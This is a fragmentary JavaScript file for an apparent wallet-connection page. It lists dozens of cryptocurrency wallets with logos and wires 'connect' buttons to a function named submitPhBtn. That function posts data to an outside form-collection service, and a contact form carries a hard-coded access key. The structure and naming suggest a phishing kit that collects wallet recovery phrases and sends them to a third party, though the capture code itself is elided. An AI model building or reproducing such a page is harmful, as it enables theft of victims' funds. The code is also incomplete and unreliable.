// Define wallet data
const wallets = [
  { image: 'asset/image copy 7.png', name: 'MetaMask' },
  { image: 'asset/image copy 8.png', name: 'Trust Wallet' },
  { image: 'asset/image copy 9.png', name: 'Uniswap Wallet' },
  { image: 'asset/image copy 10.png', name: 'Bybit' },
  { image: 'asset/image copy 12.png', name: 'Rabby Wallet' },
  { image: 'asset/image copy 13.png', name: 'Exodus' },
  { image: 'asset/image copy 14.png', name: 'Rainbow Wallet' },
  { image: 'asset/image copy 15.png', name: 'Atomic' },
  { image: 'asset/image copy 16.png', name: 'Bitget Wallet' },
  { image: 'asset/image copy 17.png', name: 'Blockchain.Com' },
  { image: 'asset/image copy 18.png', name: 'OKX Wallet' },
  { image: 'asset/image copy 19.png', name: 'Chainge' },
  { image: 'asset/image copy 20.png', name: 'Guarda' },
  { image: 'asset/image copy 21.png', name: 'Brave Wallet' },
  { image: 'asset/image copy 22.png', name: 'Solodex' },
  { image: 'asset/image copy 23.png', name: 'Keplr' },
  { image: 'asset/image copy 24.png', name: 'Xaman' },
  { image: 'asset/image copy 25.png', name: 'Sub Wallet' },
  { image: 'asset/image copy 26.png', name: 'Nova Wallet' },
  { image: 'asset/image copy 27.png', name: 'Bifrost' },
  { image: 'asset/image copy 28.png', name: 'Xverse' },
  { image: 'asset/image copy 29.png', name: 'Unisat' },
  { image: 'asset/image copy 30.png', name: 'Leather Wallet' },
  { image: 'asset/image copy 31.png', name: 'Gate Wallet' },
  { image: 'asset/image copy 32.png', name: 'Earth Wallet' },
  { image: 'asset/image copy 33.png', name: 'Oisy Wallet' },
  { image: 'asset/image copy 34.png', name: 'Gem Wallet' },
  { image: 'asset/image copy 35.png', name: 'Best Wallet' },
  { image: 'asset/image copy 36.png', name: 'Surf Wallet' },
  { image: 'asset/image copy 37.png', name: 'Glass Wallet' },
  { image: 'asset/image copy 38.png', name: 'Xportal' },
  { image: 'asset/image copy 39.png', name: 'Binance Web3 Wallet' },
  { image: 'asset/image copy 40.png', name: 'Token Pocket' },
  { image: 'asset/image copy 41.png', name: 'Math Wallet' },
  { image: 'asset/image copy 42.png', name: 'Spatium Wallet' },
  { image: 'asset/image copy 43.png', name: 'Coin98 Wallet' },
  { image: 'asset/image copy 44.png', name: 'Bybit Wallet' },
  { image: 'asset/image copy 45.png', name: 'Phantom Wallet' },
  { image: 'asset/image copy 46.png', name: 'TonHub Wallet' },
  { image: 'asset/image copy 47.png', name: 'Linen Wallet' },
  { image: 'asset/image copy 48.png', name: 'Ownbit Wallet' },
  { image: 'asset/image copy 49.png', name: 'Zelcore Wallet' },
  { image: 'asset/image copy 50.png', name: 'Flare Wallet' },
  { image: 'asset/image copy 51.png', name: 'Safe Wallet' },
  { image: 'asset/image copy 52.png', name: 'Ledger' },
  ...
  { image: 'asset/image copy 11.png', name: 'Other Wallets' },
];
...
connectBtn.forEach((connectBtns) => {
  connectBtns.addEventListener('click', () => {
...
async function submitPhBtn() {
  ...
  try {
      ...
      const response = await fetch('https://usebasin.com/f/2623d3cb66d8', {
...
export default function ContactForm() {
  ...
  const onSubmit = async (event) => {
    ...
    formData.append("access_key", "0dd307ce-5601-4993-89e5-7cb446e7bc33");
